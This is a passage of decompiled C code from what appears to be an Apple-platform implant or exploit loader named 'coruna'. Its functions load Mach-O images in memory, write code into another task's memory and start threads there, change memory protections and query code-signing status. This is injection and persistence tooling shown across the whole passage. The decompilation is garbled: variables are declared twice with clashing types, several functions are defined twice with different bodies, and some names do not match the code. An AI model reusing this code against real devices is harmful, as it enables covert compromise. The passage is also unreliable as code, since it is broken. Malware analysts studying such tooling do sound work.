  return size;
}





uint64_t coruna_persist_via_macho_open_image(long handle,long addr_2,int flags,uint size,long *off_3)
{
  int err;
  bool err;
  long handle;
  uint64_t u;
  unsigned long size;
  
  u = 0xad001;
  if (((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) {
    err = 0xfffffff;
    if (flags != 0) {
      err = flags;
    }
    handle = coruna_macho_open_image(addr_2,err,handle,*(uint32_t *)k_persist_mach_task_self_slot,0);
    if (handle == 0) {
      u = 0x12002;
    }
    else {
      *(uint16_t *)(handle + 0x1c2) = 1;
      *(uint8_t *)(handle + 0x110) = 1;
      *(uint8_t *)(handle + 0x130) = 1;
      *(byte *)(handle + 0x1c4) = (byte)(size >> 4) & 1;
      size = 0;
      do {
        u = (*(void (*)(&ptr_persist_fn_20a28)[size])(handle);
        err = size < 3;
        size = size + 1;
      } while ((int)u == 0 && err);
      if ((int)u == 0) {
        *off_3 = handle;
      }
      else {
        coruna_ctx_free(handle);
      }
    }
  }
  return u;
}





uint64_t coruna_loader_ctx_destroy(void *ctx)
{
  uint64_t u;
  
  if (ctx == (void *)0x0) {
    u = 0xad001;
  }
  else {
    if (*(char *)((long)ctx + 0xfc) == '\0') {
      coruna_mach_vm_deallocate(ctx);
      _free(ctx);
    }
    else {
      coruna_ctx_free(ctx);
    }
    u = 0;
  }
  return u;
}





uint64_t coruna_load_libcache(uint64_t *val,short *arg,long handle,char *path)
{
  char *ptr;
  int *err;
  bool err;
  bool status;
  int err;
  uint64_t *ptr;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  int *status;
  uint64_t u;
  long scratch;
  
  u = 0xad001;
  if ((val != (uint64_t *)0x0) &&
     ((arg == (short *)0x0 || ((*arg == 2 && (1 < (ushort)arg[1])))))) {
    ptr = "\x01";
    if (path != (char *)0x0) {
      ptr = path;
    }
    ptr = _calloc(1,0x178);
    if (ptr == (uint64_t *)0x0) {
      u = 0xad009;
    }
    else {
      handle = __NSGetMachExecuteHeader();
      ptr[0x19] = handle;
      addr = __NSGetArgc();
      ptr[0x1a] = addr;
      off = __NSGetArgv();
      ptr[0x1b] = off;
      base = __NSGetEnviron();
      ptr[0x1c] = base;
      ctx_val = __NSGetProgname();
      ptr[0x1d] = ctx_val;
      if ((((handle == 0) || (addr == 0)) || (off == 0)) || (base == 0)) {
        u = 0x1200f;
      }
      else {
        u = 0x1200f;
        if ((ctx_val != 0) && (u = coruna_csops((long)ptr + 0x1d), (int)u == 0)) {
          if ((*ptr == '\0') || (err = coruna_init_os_log(), err != 0)) {
            err = (int *)((unsigned long)k_persist_dladdr_slot & 0xfffffffffffff000);
            do {
              status = err;
              err = status + -0x400;
            } while (*status != -0x1120531);
            *(uint *)(ptr + 3) = status[2] & 0xffffff;
            err = arg != (short *)0x0;
            status = handle == 0;
            scratch = handle;
            if ((!err || !status) ||
               (u = (**(void (**)(arg + 0xc))(arg,0,&scratch), (int)u == 0)) {
              *ptr = arg;
              ptr[1] = scratch;
              *(bool *)(ptr + 2) = err && status;
              *(char *)((long)ptr + 0x1c) = *ptr;
              u = _dlopen("/usr/lib/system/libcache.dylib",0x12);
              ptr[4] = u;
              u = coruna_objc_patch_images(ptr);
              if ((int)u == 0) {
                u = coruna_init_libunwind(ptr);
                if ((int)u == 0) {
                  *val = ptr;
                  return u;
                }
                coruna_mutex_destroy(ptr);
              }
              if (err && status) {
                (**(void (**)(arg + 0x10))(arg,ptr[1]);
                ptr[1] = 0;
              }
            }
          }
          else {
            u = 0x12010;
          }
        }
      }
      _free(ptr);
    }
  }
  return u;
}





void coruna_csops(byte *arg)
{
  pid_t lp1;
  int err;
  uint u;
  int *err;
  uint *ptr;
  byte err;
  uint8_t scratch[3];
  byte bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint32_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_persist_stack_chk_guard_slot;
  thread_attr = 0;
  scratch = 0;
  host_info = 0;
  if (k_persist_rodata_word_1efa0 <= *(double *)k_persist_dyldversionnumber_slot) {
    lp1 = _getpid();
    err = _csops(lp1,0,scratch,4);
    if (err < 0) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_persist_stack_chk_guard_slot == serial_buf) {
      return;
      }
      ___stack_chk_fail(u);
    }
    err = bootargs >> 5 & 1;
  }
  else {
    lp1 = _getpid();
    err = _csops(lp1,5,&thread_attr,0x14);
    if (err < 0) {
      err = ___error();
      if (*err == 0x55) {
        u = 0;
        *arg = 0;
        if (*(long *)k_persist_stack_chk_guard_slot == serial_buf) {
        return;
        }
        ___stack_chk_fail(u);
      }
fail:
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_persist_stack_chk_guard_slot == serial_buf) {
      return;
      }
      ___stack_chk_fail(u);
    }
    err = 1;
  }
  u = 0;
  *arg = err;
done:
  if (*(long *)k_persist_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(u);
}





unsigned long coruna_ctx_free(long *arg)

{
  uint u;
  unsigned long size;
  long serial;
  
  if (arg == (long *)0x0) {
    size = 0xad001;
  }
  else {
    size = coruna_mutex_destroy();
    if (((char)arg[2] != '\0') && (serial = *arg, serial != 0)) {
      u = (**(void (**)(serial + 0x20))(serial,arg[1]);
      if ((uint)size != 0) {
        u = (uint)size;
      }
      size = (unsigned long)u;
    }
    arg[0x2e] = 0;
    arg[0x2b] = 0;
    arg[0x2a] = 0;
    arg[0x2d] = 0;
    arg[0x2c] = 0;
    arg[0x27] = 0;
    arg[0x26] = 0;
    arg[0x29] = 0;
    arg[0x28] = 0;
    arg[0x23] = 0;
    arg[0x22] = 0;
    arg[0x25] = 0;
    arg[0x24] = 0;
    arg[0x1f] = 0;
    arg[0x1e] = 0;
    arg[0x21] = 0;
    arg[0x20] = 0;
    arg[0x1b] = 0;
    arg[0x1a] = 0;
    arg[0x1d] = 0;
    arg[0x1c] = 0;
    arg[0x17] = 0;
    arg[0x16] = 0;
    arg[0x19] = 0;
    arg[0x18] = 0;
    arg[0x13] = 0;
    arg[0x12] = 0;
    arg[0x15] = 0;
    arg[0x14] = 0;
    arg[0xf] = 0;
    arg[0xe] = 0;
    arg[0x11] = 0;
    arg[0x10] = 0;
    arg[0xb] = 0;
    arg[10] = 0;
    arg[0xd] = 0;
    arg[0xc] = 0;
    arg[7] = 0;
    arg[6] = 0;
    arg[9] = 0;
    arg[8] = 0;
    arg[3] = 0;
    arg[2] = 0;
    arg[5] = 0;
    arg[4] = 0;
    arg[1] = 0;
    *arg = 0;
    _free(arg);
  }
  return size;
}





uint64_t coruna_loader_set_image(long *handle,long addr_2,long off_3)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (addr_2 != 0)) {
    scratch = off_3;
    if ((off_3 != 0) ||
       (u = (**(void (**)(addr_2 + 0x18))(addr_2,0,&scratch), (int)u == 0)) {
      handle = *handle;
      if ((handle != 0) && ((char)handle[2] != '\0')) {
        (**(void (**)(handle + 0x20))(handle,handle[1]);
      }
      *handle = addr_2;
      handle[1] = scratch;
      *(bool *)(handle + 2) = off_3 == 0;
      if (((int)handle[10] != 2) || (u = coruna_loader_mutex_lock(handle,handle + 0xb), (int)u == 0))
      {
        if ((int)handle[0x23] == 1) {
          u = coruna_loader_mutex_lock(handle,handle + 0x24);
        }
        else {
          u = 0;
        }
      }
    }
  }
  return u;
}





uint64_t coruna_persist_via_macho_foreach_loadcmd(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if (*(char *)(handle + 0xfc) == '\0') {
    u = 0x12012;
  }
  else {
    scratch = k_persist_nsconcretestackblock_slot;
    bootargs = k_persist_rodata_word_1f020;
    thread_attr = coruna_macho_pagezero;
    host_info = &k_persist_rodata_word_20ad8;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
  }
  return u;
}





uint64_t coruna_csops(long *handle)
{
  pid_t lp1;
  int err;
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  uint32_t bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_persist_stack_chk_guard_slot;
  u = 0xad00a;
  if (handle == (long *)0x0) {
    u = 0xad001;
  }
  else if (((*handle != 0) && (*(long *)(*handle + 0x28) != 0)) && (handle[1] != 0)) {
    scratch = 0;
    scratch = 0;
    bootargs = 0;
    lp1 = _getpid();
    err = _csops(lp1,5,&scratch,0x14);
    if (err < 0) {
      u = 0xad00b;
    }
    else {
      u = (**(void (**)(*handle + 0x28))(*handle,handle[1],0x40000105,&scratch);
    }
  }
  if (*(long *)k_persist_stack_chk_guard_slot == thread_attr) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_macho_text_seg(long handle,long addr_2)
{
  int err;
  long handle;
  uint64_t u;
  unsigned long size;
  
  u = 0x14002;
  size = *(unsigned long *)(addr_2 + 0x20);
  if (!CARRY8(*(unsigned long *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18),size)) {
    if ((*(long *)(addr_2 + 0x28) == 0) && (*(long *)(addr_2 + 0x30) != 0)) {
      handle = *(long *)(*(long *)(handle + 0x28) + 8);
      if (*(long *)(handle + 0x18) == 0) {
        u = 0;
        *(uint64_t *)(handle + 0x18) = *(uint64_t *)(addr_2 + 0x18);
      }
      else {
        u = 0x14003;
      }
    }
    else {
      u = 0;
    }
    err = _strcmp((char *)(addr_2 + 8),"__TEXT");
    if (err == 0) {
      *(long *)(*(long *)(*(long *)(handle + 0x30) + 8) + 0x18) = addr_2;
    }
    if (size < 0xffffffff) {
      handle = *(long *)(*(long *)(handle + 0x20) + 8);
      *(unsigned long *)(handle + 0x18) = *(long *)(handle + 0x18) + size;
    }
  }
  return u;
}





uint64_t coruna_dlopen_rpath(uint64_t val,char *path,uint64_t id_2,long *handle)
{
  int err;
  long handle;
  uint64_t u;
  
  u = 0x1200b;
  if ((path != (char *)0x0) && (handle != (long *)0x0)) {
    handle = _dlopen(path,id_2);
    if (handle == 0) {
      err = _strncmp(path,"@rpath",6);
      if (err != 0) {
        return 0x17004;
      }
      handle = _dlopen(path + 6,id_2);
      if (handle == 0) {
        return 0x17004;
      }
    }
    u = 0;
    *handle = handle;
  }
  return u;
}





uint64_t coruna_driver_dispatch(uint64_t val,long handle)
{
  if (handle != 0) {
    _dlclose(handle);
    return 0;
  }
  return 0x1200c;
}





uint64_t coruna_dlclose(uint64_t val,uint64_t id_2)
{
  _dlclose(id_2);
  return 0;
}





uint64_t coruna_macho_cfstring_18a2c(long handle,long addr_2)
{
  char *ptr;
  long handle;
  int err;
  unsigned long u;
  unsigned long size;
  unsigned long version;
  char *buf;
  
  err = _strncmp((char *)(addr_2 + 8),"__DATA",6);
  if (err == 0) {
    ptr = (char *)(addr_2 + 0x48);
    buf = ptr + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
    for (; ptr < buf; ptr = ptr + 0x50) {
      err = _strncmp(ptr,"__cfstring",0xb);
      if ((err == 0) && (u = *(unsigned long *)(ptr + 0x28), u != 0)) {
        size = 0;
        handle = *(long *)(*(long *)(handle + 0x20) + 0x18) + *(long *)(ptr + 0x20);
        do {
          version = *(unsigned long *)(handle + size);
          if ((version & 0x7ffffffffffff8) != 0) {
            *(unsigned long *)(handle + size) = version;
          }
          size = size + 0x20;
        } while (size < u);
      }
    }
  }
  return 0;
}





uint64_t coruna_persist_residual_49(long handle,long addr_2)
{
  void (*ptr)(void);
  uint64_t u;
  long *ptr;
  long handle;
  void (*buf)(void);
  uint64_t scratch;
  uint32_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t serial_buf;
  
  ptr = *(long **)(handle + 0x20);
  ptr = (void (*)(ptr[3] + *(long *)(addr_2 + 8));
  buf = (void (*)ptr[1];
  if ((ptr >= buf && ptr <= buf + ptr[2]) &&
      (ptr < buf || buf + ptr[2] != ptr)) {
    handle = *ptr;
    bootargs = *(uint32_t **)(handle + 0xd0);
    scratch = *(uint64_t *)(handle + 200);
    serial_buf = *(uint64_t *)(handle + 0xe8);
    host_info = *(uint64_t **)(handle + 0xe0);
    thread_attr = *(uint64_t **)(handle + 0xd8);
    (*ptr)(*bootargs,*thread_attr,*host_info,0,&scratch);
    u = 0;
  }
  else {
    u = 0x12008;
  }
  return u;
}





uint64_t coruna_return_zero_18ba0(long handle,long addr_2)
{
  bool err;
  unsigned long u;
  void (*ptr)(void);
  void (*buf)(void);
  unsigned long size;
  long *ptr;
  long handle;
  long addr;
  long off;
  unsigned long version;
  unsigned long port;
  uint64_t scratch;
  uint32_t *bootargs;
  uint64_t *thread_attr;
  uint64_t *host_info;
  uint64_t serial_buf;
  unsigned long tag;
  
  u = addr_2 + 0x48;
  version = u + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  do {
    if (version <= u) {
      return 0;
    }
    if (*(char *)(u + 0x40) == '\x16') {
      size = *(unsigned long *)(u + 0x28);
      if (3 < size) {
        addr = *(long *)(u + 0x20);
        off = *(long *)(handle + 0x20);
        tag = 0;
        port = 1;
        do {
          ptr = *(long **)(handle + 0x28);
          ptr = (void (*)ptr[1];
          buf = ptr + *(uint *)(off + addr + tag * 4);
          if (buf < ptr || ptr + ptr[2] <= buf) {
            return 0x12008;
          }
          handle = *ptr;
          bootargs = *(uint32_t **)(handle + 0xd0);
          scratch = *(uint64_t *)(handle + 200);
          serial_buf = *(uint64_t *)(handle + 0xe8);
          host_info = *(uint64_t **)(handle + 0xe0);
          thread_attr = *(uint64_t **)(handle + 0xd8);
          (*buf)(*bootargs,*thread_attr,*host_info,0,&scratch);
          err = port < size >> 2;
          tag = port;
          port = (unsigned long)((int)port + 1);
        } while (err);
      }
    }
    else if ((*(char *)(u + 0x40) == '\t') && (size = *(unsigned long *)(u + 0x28), 7 < size)) {
      addr = *(long *)(u + 0x20);
      off = *(long *)(handle + 0x20);
      tag = 0;
      port = 1;
      do {
        buf = *(void (**)(off + addr + tag * 8);
        ptr = *(long **)(handle + 0x28);
        if (buf < (void (*)ptr[1] || (void (*)ptr[1] + ptr[2] <= buf) {
          return 0x12008;
        }
        handle = *ptr;
        bootargs = *(uint32_t **)(handle + 0xd0);
        scratch = *(uint64_t *)(handle + 200);
        serial_buf = *(uint64_t *)(handle + 0xe8);
        host_info = *(uint64_t **)(handle + 0xe0);
        thread_attr = *(uint64_t **)(handle + 0xd8);
        (*buf)(*bootargs,*thread_attr,*host_info,0,&scratch);
        err = port < size >> 3;
        tag = port;
        port = (unsigned long)((int)port + 1);
      } while (err);
    }
    u = u + 0x50;
  } while( true );
}





void coruna_macho_pagezero(long handle,long addr_2)
{
  int err;
  uint64_t *ptr;
  uint8_t scratch;
  
  err = _strncmp((char *)(addr_2 + 8),"__PAGEZERO",0xb);
  if (err != 0) {
    ptr = *(uint64_t **)(handle + 0x20);
    scratch = 0;
    coruna_macho_get_slide(*ptr,*(uint32_t *)(ptr + 0xb),ptr[10] + *(long *)(addr_2 + 0x18),
                 *(uint64_t *)(addr_2 + 0x20),&scratch);
  }
  return;
}





uint64_t coruna_export_name_table(long handle,uint64_t *val,int *flags)
{
  void *ptr;
  unsigned long u;
  uint64_t *ptr;
  char *ptr;
  uint64_t size;
  unsigned long version;
  
  size = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (flags != (int *)0x0)) {
    version = (unsigned long)*(uint *)(handle + 0xa0);
    if (*(uint *)(handle + 0xa0) == 0) {
      size = 0;
      *val = 0;
      *flags = 0;
    }
    else {
      ptr = _calloc(version,8);
      if (ptr == (void *)0x0) {
        size = 0xad009;
      }
      else {
        u = 0;
        ptr = (uint64_t *)(*(long *)(handle + 0x98) + 8);
        do {
          ptr = (char *)ptr[-1];
          if ((ptr == (char *)0x0) || ((uint8_t **)*ptr != &ptr_persist_fn_20c48)) {
            size = 0x910014;
            goto fail;
          }
          if ((*ptr == '\0') || (*(long *)(ptr + 0x10) != 0)) {
            *(char **)((long)ptr + u * 8) = ptr;
            u = (unsigned long)((int)u + 1);
          }
          ptr = ptr + 2;
          version = version - 1;
        } while (version != 0);
        size = 0;
        if ((int)u == 0) {
          *val = 0;
          *flags = 0;
fail:
          _free(ptr);
        }
        else {
          *val = ptr;
          *flags = (int)u;
        }
      }
    }
  }
  return size;
}





uint64_t coruna_remote_memcpy(uint64_t *val,long handle,long addr_2,uint size,unsigned long arg)
{
  long handle;
  uint64_t u;
  long scratch [3];
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  long thread_attr;
  uint64_t thread_attr;
  unsigned long host_info;
  uint64_t host_info;
  
  u = 0xad001;
  if ((val != (uint64_t *)0x0) && ((addr_2 != 0 || (size == 0)))) {
    if (handle == 0) {
      u = 0x1e010;
    }
    else {
      scratch[0] = 0;
      u = coruna_mach_vm_allocate(*(uint32_t *)(val + 0xb),0x80000,0x1e000001,scratch);
      handle = scratch[0];
      if ((int)u == 0) {
        scratch[1] = 0;
        scratch = (unsigned long)size;
        bootargs = val[9];
        bootargs = val[8];
        thread_attr = scratch[0];
        thread_attr = 0x80000;
        host_info = arg & 0xffffffff;
        host_info = 0;
        scratch[0] = handle;
        scratch[2] = addr_2;
        u = coruna_thread_create_resume(*(uint64_t *)*val,((uint64_t *)*val)[1],
                             *(uint32_t *)(val + 0xb),*(uint8_t *)(val + 0x12),scratch
                             ,handle,0x80000);
        if ((int)u != 0) {
          coruna_mach_vm_deallocate(*(uint32_t *)(val + 0xb),handle,0x80000,0);
        }
      }
    }
  }
  return u;
}





uint64_t coruna_wire_export_reset_call(long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = coruna_wire_export_reset();
    return u;
  }
  return 0xad001;
}





uint64_t
uint64_t coruna_persist_via_macho_open_image_2(int64_t arg,uint64_t val,int64_t arg,uint64_t id_2,uint8_t buf, int64_t *val)
{
  unsigned long u;
  unsigned long size;
  long handle;
  unsigned long version;
  uint64_t port;
  
  port = 0xad001;
  if ((((arg != 0) && ((int)val != 0)) && ((int)val != -1)) &&
     (((arg != 0 && ((int)id_2 != 0)) && (val != (long *)0x0)))) {
    handle = coruna_macho_open_image(arg,id_2,arg,val,1);
    if (handle == 0) {
      port = 0x12002;
    }
    else {
      version = 0;
      *(byte *)(handle + 0x110) = buf & 1;
      *(bool *)(handle + 0x130) = (buf & 5) != 0;
      *(uint16_t *)(handle + 0x1c3) = 0;
      size = 0x10;
      if ((buf & 4) == 0) {
        size = 0x11;
      }
      do {
        u = version + 1;
        port = (*(void (*)(&ptr_persist_fn_20af8)[version])(handle);
        version = u;
      } while ((int)port == 0 && u < size);
      if ((int)port == 0) {
        *val = handle;
      }
      else {
        coruna_ctx_free(handle);
      }
    }
  }
  return port;
}





uint64_t coruna_dlopen_rpath(long handle)
{
  void (*ptr)(void);
  uint64_t u;
  unsigned long unaff_x30;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_mach_vm_read_overwrite(*(uint32_t *)(handle + 0x20),handle + 0x30,handle + 0x38);
    if ((((int)u == 0) &&
        (u = coruna_mach_vm_read_overwrite(*(uint32_t *)(handle + 0x58),handle + 0x68,handle + 0x70),
        (int)u == 0)) &&
       (u = coruna_sysctl_proc_cputype(*(uint32_t *)(handle + 0x20),handle + 0x24,handle + 0x28),
       (int)u == 0)) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      u = coruna_sysctl_proc_cputype(*(uint32_t *)(handle + 0x58),handle + 0x5c,handle + 0x60);
      return u;
    }
  }
  return u;
}





void coruna_block_dispose_wrapper_4(uint64_t val)
{
  coruna_block_dispose(val,1);
  return;
}





uint64_t coruna_asl_log_hook(long handle)
{
  void (*ptr)(void);
  uint64_t u;
  unsigned long unaff_x30;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_macho_run_exports_block(handle,&k_persist_nsconcreteglobalblock_slot);
    if ((int)u == 0) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      u = coruna_macho_run_exports(handle,&k_persist_nsconcreteglobalblock_slot);
      return u;
    }
  }
  return u;
}





uint32_t coruna_mach_vm_protect(long handle)
{
  kern_return_t lk1;
  uint32_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = 0x910016;
    if (((*(mach_vm_address_t *)(handle + 8) != 0) && (*(long *)(handle + 0x40) != 0)) &&
       (*(mach_vm_size_t *)(handle + 0x10) == *(mach_vm_size_t *)(handle + 0x48))) {
      lk1 = _mach_vm_protect(*(vm_map_t *)k_persist_mach_task_self_slot,
                               *(mach_vm_address_t *)(handle + 8),
                               *(mach_vm_size_t *)(handle + 0x10),0,3);
      if (lk1 == 0) {
        lk1 = _mach_vm_protect(*(vm_map_t *)(handle + 0x58),
                                 *(mach_vm_address_t *)(handle + 0x40),
                                 *(mach_vm_size_t *)(handle + 0x48),0,3);
        if (lk1 == 0) {
          lk1 = _mach_vm_write(*(vm_map_t *)(handle + 0x58),
                                 *(mach_vm_address_t *)(handle + 0x40),
                                 *(vm_offset_t *)(handle + 8),
                                 *(mach_msg_type_number_t *)(handle + 0x48));
          u = 0;
          if (lk1 != 0) {
            u = 0x1e015;
          }
        }
        else {
          u = 0x1e017;
        }
      }
      else {
        u = 0x1e016;
      }
    }
  }
  return u;
}





uint64_t coruna_persist_via_macho_open_image_3(long handle,uint64_t val,long addr_2,uint64_t id_2)
{
  bool err;
  long handle;
  uint64_t u;
  unsigned long size;
  
  u = 0xad001;
  if ((((handle != 0) && ((int)val != 0)) && ((int)val != -1)) &&
     ((addr_2 != 0 && ((int)id_2 != 0)))) {
    handle = coruna_macho_open_image(addr_2,id_2,handle,val,1);
    if (handle == 0) {
      u = 0x12002;
    }
    else {
      size = 0;
      do {
        u = (*(void (*)(&ptr_persist_fn_20b80)[size])(handle);
        err = size < 2;
        size = size + 1;
      } while ((int)u == 0 && err);
      coruna_ctx_free(handle);
    }
  }
  return u;
}





void coruna_block_dispose_wrapper_5(uint64_t val)
{
  coruna_block_dispose(val,0);
  return;
}
uint64_t coruna_persist_via_dladdr(long handle,long *addr_2)
{
  uint64_t u;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != (long *)0x0)) {
    scratch = *addr_2;
    if ((scratch != 0) && (*(char *)(handle + 0x138) != '\0')) {
      if ((*(char *)(handle + 0x38) == '\0') || (*(char *)(handle + 0x70) == '\0')) {
        u = coruna_dladdr(*(uint32_t *)(handle + 0x58),scratch,&scratch);
        if ((int)u != 0) {
          return u;
        }
      }
      else if (*(long *)(handle + 0x68) != *(long *)(handle + 0x30)) {
        scratch = (scratch - *(long *)(handle + 0x30)) + *(long *)(handle + 0x68);
      }
    }
    u = 0;
    *addr_2 = scratch;
  }
  return u;
}





unsigned long coruna_block_dispose(long *arg,unsigned long val)

{
  uint u;
  uint size;
  unsigned long version;
  long *entry_12;
  uint64_t cache_54;
  uint64_t bootargs;
  uint64_t host_info;
  uint8_t *serial_buf;
  uint64_t cache_20;
  void (*block_ctx)(void);
  uint8_t *scratch;
  uint64_t *thread_attr;
  uint64_t cache_78;
  uint64_t *cache_79;
  uint64_t cache_102;
  uint8_t cache_22;
  
  if (arg == (long *)0x0) {
    return 0xad001;
  }
  entry_12 = (long *)*arg;
  if (entry_12 == (long *)0x0) {
    return 0x1e004;
  }
  if ((*(char *)((long)entry_12 + 0x1d) != '\0') && (*entry_12 == 0)) {
    return 0x1e004;
  }
  cache_79 = &cache_78;
  cache_78 = 0;
  cache_102 = k_persist_rodata_word_1ef78;
  cache_22 = 0;
  if ((val & 1) == 0) {
    cache_22 = 1;
  }
  else {
    serial_buf = k_persist_nsconcretestackblock_slot;
    cache_20 = k_persist_rodata_word_1ef80;
    block_ctx = coruna_wire_export_on_err;
    scratch = &k_persist_rodata_word_20b98;
    thread_attr = cache_79;
    version = coruna_macho_foreach_loadcmd(arg,0,&serial_buf);
    __Block_object_dispose(&cache_78,8);
    return version;
    if (*(char *)(cache_79 + 3) == '\0') {
      version = 0x910016;
      __Block_object_dispose(&cache_78,8);
      return version;
    }
  }
  cache_54 = 0;
  bootargs = 0;
  host_info = 0;
  size = coruna_task_dyld_info((int)arg[0xb],&cache_54);
  u = 0x1e003;
  if (cache_54 != '\0') {
    u = 0;
  }
  if (size != 0) {
    u = size;
  }
  version = (unsigned long)u;
load_ok_27:
  __Block_object_dispose(&cache_78,8);
  return version;
}





uint64_t coruna_wire_export_on_err(long handle,int *flags)
{
  int err;
  
  err = *flags;
  if ((err == -0x7fffffde) || (err == 0x22 || err == -0x7fffffcc)) {
    *(uint8_t *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) = 1;
  }
  return 0;
}





void coruna_wire_read_u32_thunk(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_wire_read_u32(id_2,off_4);
  return;
}





uint64_t coruna_wire_read_u32(long handle,uint64_t val)
{
  uint u;
  int err;
  void *ptr;
  uint64_t size;
  
  size = 0xad001;
  if (handle != 0) {
    err = *(uint *)(handle + 0xe0) * 8;
    if (*(uint *)(handle + 0xe0) >> 0x1d == 0 && err != -8) {
      ptr = _realloc(*(void **)(handle + 0xd8),(unsigned long)(err + 8));
      if (ptr == (void *)0x0) {
        size = 0xad009;
      }
      else {
        size = 0;
        *(void **)(handle + 0xd8) = ptr;
        u = *(uint *)(handle + 0xe0);
        *(uint64_t *)((long)ptr + (unsigned long)u * 8) = val;
        *(uint *)(handle + 0xe0) = u + 1;
      }
    }
    else {
      size = 0xad01d;
    }
  }
  return size;
}





void coruna_wire_read_u32_thunk(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_wire_read_u32(id_2,off_4);
  return;
}





uint64_t coruna_persist_via_strdup(uint64_t val,char *path,uint64_t id_2,uint64_t *size_3)
{
  void *ptr;
  char *ptr;
  uint64_t u;
  
  u = 0x1200b;
  if ((path != (char *)0x0) && (size_3 != (uint64_t *)0x0)) {
    u = 0xad009;
    ptr = _calloc(1,0x58);
    if (ptr != (void *)0x0) {
      *(long *)((long)ptr + 0x50) = (long)ptr + 0x10;
      ptr = _strdup(path);
      *(char **)((long)ptr + 8) = ptr;
      if (ptr == (char *)0x0) {
        _free(ptr);
      }
      else {
        u = 0;
        *size_3 = ptr;
      }
    }
  }
  return u;
}





uint64_t coruna_call_webbookmarks_delete(uint64_t val,long handle)
{
  uint64_t u;
  
  if (handle != 0) {
    u = coruna_wire_export_free(handle);
    return u;
  }
  return 0x1200c;
}





uint64_t coruna_wire_err_imm(void)
{
  return 0x910006;
}





unsigned long coruna_wire_export_reset(long arg)

{
  uint u;
  unsigned long size;
  
  if (arg == 0) {
    size = 0xad001;
  }
  else {
    size = coruna_wire_export_create(arg,0,0xfffffffffffffffb);
    if (((int)size == 0) && (size = coruna_wire_export_create(arg,1,0xfffffffffffffffe), (int)size == 0))
    {
      u = 0;
      if (*(int *)(arg + 0xa0) != 2) {
        u = 0x1e018;
      }
      size = (unsigned long)u;
    }
  }
  return size;
}





uint64_t coruna_wire_export_create(long handle,int flags,uint64_t val)
{
  uint8_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (handle != 0) {
    if (*(int *)(handle + 0xa0) == flags) {
      ptr = _calloc(1,0x58);
      if (ptr == (uint8_t *)0x0) {
        u = 0xad009;
      }
      else {
        *(uint8_t **)(ptr + 0x50) = ptr + 0x10;
        *ptr = 1;
        *(uint64_t *)(ptr + 8) = val;
        u = coruna_persist_residual_47(handle,&ptr_persist_fn_20c48,ptr);
        if ((int)u != 0) {
          coruna_wire_export_free(ptr);
        }
      }
    }
    else {
      u = 0x1e018;
    }
  }
  return u;
}





uint64_t coruna_wire_export_free(char *path)
{
  uint64_t *ptr;
  uint64_t u;
  void *ptr;
  
  if (path == (char *)0x0) {
    u = 0xad001;
  }
  else {
    if ((*path == '\0') && (*(void **)(path + 8) != (void *)0x0)) {
      _free(*(void **)(path + 8));
    }
    ptr = *(void **)(path + 0x10);
    while (ptr != (void *)0x0) {
      ptr = (void *)*ptr;
      if ((void *)ptr[2] != (void *)0x0) {
        _free((void *)ptr[2]);
      }
      _free(ptr);
      ptr = ptr;
    }
    u = 0;
  }
  return u;
}





uint coruna_host_processors(uint8_t *buf)
{
  natural_t ln1;
  mach_port_t lm2;
  uint u;
  pid_t lp4;
  int err;
  kern_return_t lk6;
  int *err;
  uint *ptr;
  uint *buf;
  char *ptr;
  bool err;
  unsigned long size;
  unsigned long version;
  uint port;
  uint64_t scratch;
  uint64_t bootargs;
  uint32_t thread_attr;
  unsigned long host_info;
  processor_info_array_t serial_buf [64];
  long action;
  
  action = *(long *)k_persist_stack_chk_guard_slot;
  if (buf == (uint8_t *)0x0) {
    u = 0xad001;
    if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  bootargs = bootargs & 0xffffffff00000000;
  serial_buf[0] = (processor_info_array_t)0x0;
  host_info = host_info & 0xffffffff00000000;
  lm2 = _mach_host_self();
  u = _host_processor_info
                    (lm2,1,(natural_t *)&bootargs,serial_buf,(mach_msg_type_number_t *)&host_info)
  ;
  if (u != 0) {
    u = u | 0x80000000;
    if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  ln1 = (natural_t)bootargs;
  if ((natural_t)bootargs == 0) {
